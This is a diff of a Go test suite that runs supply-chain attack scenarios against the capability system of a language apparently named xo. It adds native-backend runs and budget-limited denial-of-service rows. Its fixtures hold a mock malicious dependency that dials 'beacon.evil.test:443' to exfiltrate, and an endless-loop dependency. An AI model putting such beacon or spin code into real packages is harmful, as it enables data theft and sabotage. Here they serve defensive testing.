@@ -33,8 +33,25 @@ func TestSupplyChainAttacks(t *testing.T) {
 			t.Errorf("%s: blocked at %q, expected %q (%s)", a.name, stage, a.want, detail)
 		}
 	}
+	// the run time rows again on the native backends (decision 0175):
+	// reported apart, they are the same scenarios
+	var natives []scResult
+	if !testing.Short() {
+		for _, be := range nativeBackends(t) {
+			for _, a := range scAttacks {
+				if a.native == nil {
+					continue
+				}
+				stage, detail := a.native(t, []string{"--no-gc", "--backend=" + be})
+				natives = append(natives, scResult{Attack: a.name + " (" + be + ", --no-gc)", Class: a.class, Stage: stage, Detail: detail, Want: a.want})
+				if stage != a.want {
+					t.Errorf("%s on %s: blocked at %q, expected %q (%s)", a.name, be, stage, a.want, detail)
+				}
+			}
+		}
+	}
 	if os.Getenv("XO_SC_REPORT") != "" {
-		writeSCReport(t, results)
+		writeSCReport(t, results, natives)
 	}
 }
 
@@ -47,6 +64,17 @@ type scAttack struct {
 	class string
 	want  string // expected blocking stage
 	run   func(t *testing.T) (stage, detail string)
+	// native runs the consumer's test with the flags of a native build
+	// (rows blocked at run time, decision 0175); nil for the others
+	native func(t *testing.T, flags []string) (stage, detail string)
+}
+
+// scNative is an attack blocked at run time by a consumer test: run is
+// test with no flags (the Go backend), native the same with flags.
+func scNative(a scAttack, test func(t *testing.T, flags []string) (string, string)) scAttack {
+	a.run = func(t *testing.T) (string, string) { return test(t, nil) }
+	a.native = test
+	return a
 }
 
 // scWorld sets up a module world from source and returns the consumer dir.
@@ -105,27 +133,26 @@ var scAttacks = []scAttack{
 			return scStageFromCheck(t, app, "XO1309")
 		},
 	},
-	{
+	scNative(scAttack{
 		name:  "exfiltrate over net, attenuated capability",
 		class: "data exfiltration",
 		want:  scStageRuntime,
-		run: func(t *testing.T) (string, string) {
-			app := scWorld(t, map[string]string{
-				"evil.test/beacon@v1.0.0/xo.mod": "module evil.test/beacon\nedition preview\n",
-				"evil.test/beacon@v1.0.0/b.xo":   "pub fn report(net: Net) -> Bool uses net.dial {\n  net.dial(\"beacon.evil.test:443\").is_ok()\n}\n",
-			}, map[string]string{
-				"xo.mod": "module example.com/app\nedition preview\n\nrequire evil.test/beacon v1.0.0 uses net.dial\n",
-				"app_test.xo": "use evil.test/beacon\n\ntest \"the beacon is denied outside the allowed host\" {\n" +
-					"  let net = os.net.only([\"api.good.test\"])\n  expect(beacon.report(net)) == false\n}\n",
-			})
-			xo(t, "mod", "tidy", "--dir", app).want(0)
-			r := xo(t, "test", app)
-			if r.code == 0 && strings.Contains(r.out, "passed") {
-				return scStageRuntime, "os.net.only([...]) denies the dial at run time (NetErr.Denied), proven by a consumer test"
-			}
-			return scStageNone, "test did not pass: " + r.out + r.err
-		},
-	},
+	}, func(t *testing.T, flags []string) (string, string) {
+		app := scWorld(t, map[string]string{
+			"evil.test/beacon@v1.0.0/xo.mod": "module evil.test/beacon\nedition preview\n",
+			"evil.test/beacon@v1.0.0/b.xo":   "pub fn report(net: Net) -> Bool uses net.dial {\n  net.dial(\"beacon.evil.test:443\").is_ok()\n}\n",
+		}, map[string]string{
+			"xo.mod": "module example.com/app\nedition preview\n\nrequire evil.test/beacon v1.0.0 uses net.dial\n",
+			"app_test.xo": "use evil.test/beacon\n\ntest \"the beacon is denied outside the allowed host\" {\n" +
+				"  let net = os.net.only([\"api.good.test\"])\n  expect(beacon.report(net)) == false\n}\n",
+		})
+		xo(t, "mod", "tidy", "--dir", app).want(0)
+		r := xo(t, append(append([]string{"test"}, flags...), app)...)
+		if r.code == 0 && strings.Contains(r.out, "passed") {
+			return scStageRuntime, "os.net.only([...]) denies the dial at run time (NetErr.Denied), proven by a consumer test"
+		}
+		return scStageNone, "test did not pass: " + r.out + r.err
+	}),
 	{
 		name:  "write files (sabotage), ceiling uses none",
 		class: "sabotage",
@@ -356,9 +383,45 @@ var scAttacks = []scAttack{
 			})
 			xo(t, "mod", "tidy", "--dir", app).want(0)
 			xo(t, "check", app).want(0)
-			return scStageNone, "a CPU/time DoS performs no capability effect; the effect and capability layer does not bound compute (a resource budget would be a separate mechanism)"
+			return scStageNone, "a CPU/time DoS performs no capability effect, so no ceiling applies; with no budget the loop runs (task.with_budget bounds it, next row)"
 		},
 	},
+	scNative(scAttack{
+		name:  "denial of service: unbounded loop, with_budget",
+		class: "sabotage/DoS",
+		want:  scStageRuntime,
+	}, func(t *testing.T, flags []string) (string, string) {
+		return scBudgeted(t, "steps: 100000", "steps", flags)
+	}),
+	scNative(scAttack{
+		name:  "denial of service: unbounded loop, with_budget cpu",
+		class: "sabotage/DoS",
+		want:  scStageRuntime,
+	}, func(t *testing.T, flags []string) (string, string) {
+		return scBudgeted(t, "cpu: 50ms", "cpu", flags)
+	}),
+}
+
+// scBudgeted runs a consumer test that calls a dependency whose function
+// never returns under task.with_budget(budget) and expects the budget to
+// stop it with Exceeded(resource) (decision 0173).
+func scBudgeted(t *testing.T, budget, resource string, flags []string) (string, string) {
+	t.Helper()
+	app := scWorld(t, map[string]string{
+		"evil.test/spin@v1.0.0/xo.mod": "module evil.test/spin\nedition preview\n",
+		"evil.test/spin@v1.0.0/s.xo":   "pub fn work() -> Int {\n  var i = 0\n  while true {\n    i += 1\n  }\n  i\n}\n",
+	}, map[string]string{
+		"xo.mod": "module example.com/app\nedition preview\n\nrequire evil.test/spin v1.0.0 uses none\n",
+		"app_test.xo": "use std/task\nuse evil.test/spin\n\ntest \"the budget stops the dependency\" {\n" +
+			"  let r = task.with_budget(os.clock, task.budget(" + budget + "), fn() -> Int { spin.work() })\n" +
+			"  expect(r.err()) == Some(task.Budgeted.Exceeded(resource: \"" + resource + "\"))\n}\n",
+	})
+	xo(t, "mod", "tidy", "--dir", app).want(0)
+	r := xo(t, append(append([]string{"test"}, flags...), app)...)
+	if r.code == 0 && strings.Contains(r.out, "passed") {
+		return scStageRuntime, "task.with_budget(" + budget + ") cancels the budgeted scope and the loop unwinds at its next iteration: Err(Exceeded(\"" + resource + "\")), proven by a consumer test"
+	}
+	return scStageNone, "test did not pass: " + r.out + r.err
 }
 
 // scStageFromCheck runs `xo check --json` and reports scStageCheck when
@@ -385,7 +448,7 @@ func firstCode(t *testing.T, out string) string {
 }
 
 // writeSCReport writes the measured table to bench/results.
-func writeSCReport(t *testing.T, rs []scResult) {
+func writeSCReport(t *testing.T, rs, natives []scResult) {
 	byStage := map[string]int{}
 	for _, r := range rs {
 		byStage[r.Stage]++
@@ -403,6 +466,14 @@ func writeSCReport(t *testing.T, rs []scResult) {
 	sort.SliceStable(sorted, func(i, j int) bool { return sorted[i].Class < sorted[j].Class })
 	for _, r := range sorted {
 		fmt.Fprintf(&b, "| %s | %s | %s | %s |\n", r.Attack, r.Class, r.Stage, r.Detail)
+	}
+	if len(natives) > 0 {
+		// the same scenarios, not counted again
+		fmt.Fprintf(&b, "\n### Native backends\n\nThe run time rows again with `xo test --no-gc` (decision 0175), not counted above:\n\n")
+		fmt.Fprintf(&b, "| attack | class | stage blocked | detail |\n|---|---|---|---|\n")
+		for _, r := range natives {
+			fmt.Fprintf(&b, "| %s | %s | %s | %s |\n", r.Attack, r.Class, r.Stage, r.Detail)
+		}
 	}
 	out := filepath.Join("..", "..", "bench", "results", "supply-chain-2026-10-11.generated.md")
 	if err := os.WriteFile(out, []byte(b.String()), 0o644); err != nil {
